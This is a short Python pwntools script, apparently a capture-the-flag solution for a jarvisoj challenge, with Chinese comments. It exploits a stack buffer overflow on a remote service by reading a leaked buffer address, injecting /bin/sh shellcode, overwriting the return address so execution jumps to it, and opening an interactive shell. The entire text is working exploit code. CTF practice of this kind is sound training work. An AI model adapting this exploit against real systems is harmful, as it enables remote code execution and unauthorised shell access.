# -*- coding: UTF-8 -*-
from pwn import *

r = pwn.remote('pwn2.jarvisoj.com', 9877)

# 截取buf的地址
buf_addr = int(r.recvline()[14:-2], 16)

# 生成一段标准shellcode
shellcode = asm(shellcraft.sh()) + '\x00'

# 由于buf被填充为shellcode，且buf地址已知，因此可以让程序跳到buf执行shellcode
#         shelloce后面填充'a'           ebp     返回地址为buf的地址
payload = shellcode.ljust(0x88, 'a') + 'b'*4 + p32(buf_addr)

r.sendline(payload)
r.interactive()
